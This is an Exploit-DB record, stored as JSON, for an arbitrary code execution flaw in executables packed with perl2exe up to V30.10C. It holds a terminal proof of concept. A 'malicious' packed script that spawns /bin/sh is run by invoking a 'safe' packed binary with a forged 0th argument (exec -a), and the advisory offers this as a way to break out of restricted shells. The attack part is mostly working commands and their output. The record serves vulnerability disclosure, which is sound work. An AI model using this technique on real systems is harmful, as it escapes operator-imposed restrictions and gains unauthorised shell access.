{"source": "https://www.exploit-db.com/exploits/51825", "vulnName": "Executables Created with perl2exe < V30.10C - Arbitrary Code Execution", "vulnEDBID": "51825", "vulnCVE": "N/A", "author": "DECRAZYO", "exploitType": "REMOTE", "platform": "MULTIPLE", "datePublished": "2024-02-27", "vulnContent": "# Exploit Title: Executables Created with perl2exe <= V30.10C - Arbitrary Code Execution\n# Date: 10/17/2023\n# Exploit Author: decrazyo\n# Vendor Homepage: https://www.indigostar.com/\n# Software Link: https://www.indigostar.com/download/p2x-30.10-Linux-x64-5.30.1.tar.gz\n# Version: <= V30.10C\n# Tested on: Ubuntu 22.04\n\n# Description:\nperl2exe packs perl scripts into native executables.\nThose executables use their 0th argument to locate a file to unpack and execute.\nBecause of that, such executables can be made to execute another executable that has been compiled with perl2exe by controlling the 0th argument.\nThat can be useful for breaking out of restricted shell environments.\n\n# Proof and Concept:\nuser@testing:~/example$ ls\np2x-30.10-Linux-x64-5.30.1.tar.gz  perl2exe-Linux-x64-5.30.1\nuser@testing:~/example$ \nuser@testing:~/example$ # Create and pack a \"safe\" perl script to target with the attack.\nuser@testing:~/example$ echo 'print(\"I am completely safe\\n\");' > safe.pl\nuser@testing:~/example$ ./perl2exe-Linux-x64-5.30.1/perl2exe safe.pl\nPerl2Exe V30.10C 2020-12-11 Copyright (c) 1997-2020 IndigoSTAR Software\n...\nGenerating safe\nuser@testing:~/example$ \nuser@testing:~/example$ # Check that the program executes as expected.\nuser@testing:~/example$ ./safe\nI am completely safe\nuser@testing:~/example$ \nuser@testing:~/example$ # Create and pack a \"malicious\" script that we want to execute.\nuser@testing:~/example$ echo 'print(\"j/k I am malicious AF\\n\");system(\"/bin/sh\");' > malicious.pl\nuser@testing:~/example$ ./perl2exe-Linux-x64-5.30.1/perl2exe malicious.pl\nPerl2Exe V30.10C 2020-12-11 Copyright (c) 1997-2020 IndigoSTAR Software\n...\nGenerating malicious\nuser@testing:~/example$ \nuser@testing:~/example$ # Our \"malicious\" file doesn't need to have execution permissions.\nuser@testing:~/example$ chmod -x malicious\nuser@testing:~/example$ ./malicious\n-bash: ./malicious: Permission denied\nuser@testing:~/example$ \nuser@testing:~/example$ # Execute the \"safe\" program with the name of the \"malicious\" program as the 0th argument.\nuser@testing:~/example$ # The \"safe\" program will unpack and execute the \"malicious\" program instead of itself.\nuser@testing:~/example$ bash -c 'exec -a malicious ./safe'\nj/k I am malicious AF\n$ pstree -s $$\nsystemd\u2500\u2500\u2500sshd\u2500\u2500\u2500sshd\u2500\u2500\u2500sshd\u2500\u2500\u2500bash\u2500\u2500\u2500safe\u2500\u2500\u2500sh\u2500\u2500\u2500pstree\n$\n            "}